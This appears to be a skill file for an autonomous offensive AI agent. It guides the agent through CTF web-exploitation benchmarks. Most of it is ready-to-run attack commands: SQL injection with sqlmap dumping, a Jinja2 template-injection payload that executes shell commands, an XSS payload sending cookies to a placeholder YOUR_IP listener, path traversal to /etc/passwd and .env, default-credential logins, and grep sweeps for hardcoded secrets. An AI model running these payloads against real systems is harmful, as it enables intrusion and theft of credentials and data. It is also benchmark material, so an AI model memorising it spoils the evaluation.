---
name: benchmark
description: "CTF benchmark reference — vulnerability tag mapping, exploitation techniques, and flag capture patterns for automated benchmark challenges."
allowed-tools: Bash Read Write
metadata:
  subdomain: benchmark
  when_to_use: "benchmark, ctf, challenge, flag capture, benchmark mode, automated evaluation"
  tags: benchmark, ctf
---

# Benchmark — CTF Exploitation Reference

## Main Agent (Orchestrator) Delegation

The Decepticon orchestrator's role when running a benchmark challenge:
1. Read this skill and the challenge tags from the system context
2. Build an OPPLAN with two objectives: `RECON` (priority 1) and `INITIAL_ACCESS` (priority 2, `blocked_by=[OBJ-001]`)
3. ALWAYS delegate `RECON` to the **recon subagent** first — NEVER skip recon even if the vulnerability tag seems obvious. Recon validates the oracle, confirms ciphertext layout, captures session state, and **inspects challenge source for hardcoded keys** (see Source Triage below). Without recon, exploit iterates blind.
4. Delegate `INITIAL_ACCESS` to the **exploit subagent** based on vulnerability tags — it loads `/skills/exploit/web/<tag>.md` and executes the attack
5. Do NOT run bash exploitation directly from the orchestrator — delegate to subagents via `task()`

Sub-agents read their own tag-specific skill files (e.g., `/skills/exploit/web/xss.md`).

This skill provides vulnerability-to-technique mapping for CTF benchmark challenges.

## Vulnerability Tag → Technique Mapping

| Tag | Sub-Skill | Quick Test |
|-----|-----------|------------|
| `sqli` | `/skills/exploit/web/sqli.md` | Add `'` to params, check for SQL errors |
| `xss` | `/skills/exploit/web/xss.md` | Check for input reflection, find `/report` endpoint |
| `ssti` | `/skills/exploit/web/ssti.md` | Send `{{7*7}}` in inputs, look for `49` |
| `lfi` | `/skills/exploit/web/lfi.md` | Try `../../../etc/passwd` in file params |
| `idor` | `/skills/exploit/web/idor.md` | Find IDs in URLs, access other users' data |
| `ssrf` | `/skills/exploit/web/ssrf.md` | Test URL params with `http://127.0.0.1` |
| `xxe` | `/skills/exploit/web/xxe.md` | Send XML with external entity definition |
| `path_traversal` | `/skills/exploit/web/lfi.md` | Same as LFI — `../` in file/path parameters |
| `command_injection` | `/skills/exploit/web/command-injection.md` | Try `;id` or `$(id)` in inputs |
| `default_credentials` | — | Try `admin:admin`, `admin:password`, `user:user`, `test:test` |
| `jwt` | — | Decode JWT, test `alg:none`, try weak secrets like `secret` |
| `information_disclosure` | — | Check source, `/robots.txt`, `/.git/HEAD`, hidden paths |
| `file_upload` | `/skills/exploit/web/file-upload.md` | Upload webshell with bypass |
| `deserialization` | `/skills/exploit/web/deserialization.md` | Check for serialized data |
| `cve` | — | Identify the service/version, search for known CVE exploits |
| `race_condition` | — | TOCTOU exploitation, concurrent request flooding (use `xargs -P` or `curl` in parallel) |
| `crypto` | `/skills/exploit/web/crypto.md` | **Step 0**: grep app source for hardcoded key (`grep -rn 'AES_KEY\|SECRET_KEY\|key\s*=' /workspace/*/app/ 2>/dev/null`). If key found, decrypt offline — skip oracle. Otherwise: padding oracle, CBC bit-flip, ECB cut-and-paste |
| `smuggling_desync` | — | HTTP request smuggling: CL.TE, TE.CL, TE.TE desync; front-end/back-end pipeline attacks |

**Multiple tags?** Tags are hints — try the most specific technique first (sqli > xss > ssti > lfi), then use supporting tags (idor, jwt, default_credentials) for context.

**XSS tag note**: Before attacking, determine win condition — Pattern A (bot/cookie) vs Pattern B (server-side alert/Cross series). See `/skills/exploit/web/xss.md` Win Condition section.

## Recon Phase Guidance

**Source Triage (do this FIRST — before any network probe):**

```bash
# Check if challenge source code is accessible in the workspace
ls /workspace/*/app/ 2>/dev/null
find /workspace -name "*.py" -o -name "*.js" -o -name "*.rb" -o -name "*.php" 2>/dev/null | head -20

# If source found, grep for hardcoded secrets before doing anything else
grep -rn 'AES_KEY\|SECRET_KEY\|password\|key\s*=\s*['\''"]' /workspace/*/app/ 2>/dev/null | head -20
grep -rn 'FLAG\|flag\|@FLAG@' /workspace/*/app/ 2>/dev/null | head -10
```

If the key or secret is hardcoded in the source, **decrypt/forge offline** — skip all network probing for that vector.

When probing a benchmark target:

```bash
# Get the main page and examine it
curl -sv "$TARGET/" 2>&1

# Quick endpoint discovery
curl -s "$TARGET/robots.txt"
curl -s "$TARGET/login" -D- -o /dev/null
curl -s "$TARGET/api" -D- -o /dev/null
curl -s "$TARGET/admin" -D- -o /dev/null
```

## Flag Capture Patterns

After exploitation, check ALL common flag locations:

```bash
# File system paths
curl -s "$TARGET/flag.txt"; curl -s "$TARGET/FLAG.txt"
curl -s "$TARGET/static/flag.txt"

# Via command execution (after RCE)
cat /flag.txt 2>/dev/null; cat /FLAG.txt 2>/dev/null; cat /app/flag.txt 2>/dev/null
find / -name "flag*" -type f 2>/dev/null | head -5
printenv | grep -i flag

# Database (after SQLi)
# SELECT * FROM flags; SELECT flag FROM secret; etc.
```

## Quick Playbooks

### sqli
```bash
# Detect
curl -s "$TARGET/endpoint?param=1'"
curl -s "$TARGET/endpoint?param=1' OR '1'='1"

# If manual confirms SQLi, use sqlmap
sqlmap -u "$TARGET/endpoint?param=value" --batch --dump --level=3 --risk=2

# Bypass: UNION -> UnIoN, SELECT -> SeLeCt, OR -> ||
# URL-encode: %27 for ', %20 for space
# Comments: UN/**/ION SE/**/LECT
```

### xss
```bash
# STEP 1: Determine win condition — see /skills/exploit/web/xss.md Win Condition section
curl -s "$TARGET/report" -o /dev/null -w "%{http_code}"   # 404 = Pattern B (Cross/server-side alert)

# Pattern A (bot/cookie chain) — find reflection, start listener, inject, trigger bot
curl -s "$TARGET/search?q=XSSTEST123" | grep XSSTEST123
python3 -m http.server 8888 &
# Inject: <script>fetch("http://YOUR_IP:8888/?c="+document.cookie)</script>

# Pattern B (Cross/server-side alert — no bot, no cookie) — bypass filter, produce alert() in response
curl -sg "$TARGET/page?name=abc" | grep -i "error_umbrella\|sorry"   # confirm alphanumeric filter
# Use JSFuck (node pre-installed): npm install jsfuck
# node -e "const {JSFuck}=require('./node_modules/jsfuck/jsfuck.js'); console.log(JSFuck.encode('alert(1)',false,true))"
# Submit payload and grep response for FLAG{ or new_umbrella
```

### ssti (Django/Jinja2)
```bash
# Detect template engine
curl -s "$TARGET/" -d "input={{7*7}}" | grep 49
curl -s "$TARGET/" -d "input={{config}}"

# Django SSTI
curl -s "$TARGET/" -d "input={{flag}}"
curl -s "$TARGET/" -d "input={{settings.SECRET_KEY}}"

# Jinja2 RCE
curl -s "$TARGET/" -d "input={{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
```

### idor + jwt + default_credentials
```bash
# Login with default credentials
curl -sv "$TARGET/login" -d "username=admin&password=admin" -c cookies.txt 2>&1
curl -sv "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' 2>&1

# Check for JWT in response, decode: echo "$JWT" | cut -d. -f2 | base64 -d
# IDOR: change user/object IDs — GET /api/users/1 → /api/users/2
```

### lfi + information_disclosure
```bash
# Path traversal
curl -s "$TARGET/file?path=../../../etc/passwd"
curl -s "$TARGET/page?file=....//....//....//etc/passwd"
curl -s "$TARGET/download?name=../flag.txt"

# Static file exposure
curl -s "$TARGET/.git/HEAD"
curl -s "$TARGET/robots.txt"
curl -s "$TARGET/.env"
```

## Reminders

- **Target URL**: Use ONLY the URL from the challenge context. Do NOT scan random ports.
- **Flag format**: `FLAG{<64-character-hex>}` — the flag MUST appear in the final response.
- **Time budget**: ~30 minutes per challenge.
- **Authorization**: Full — isolated CTF container. No restrictions.
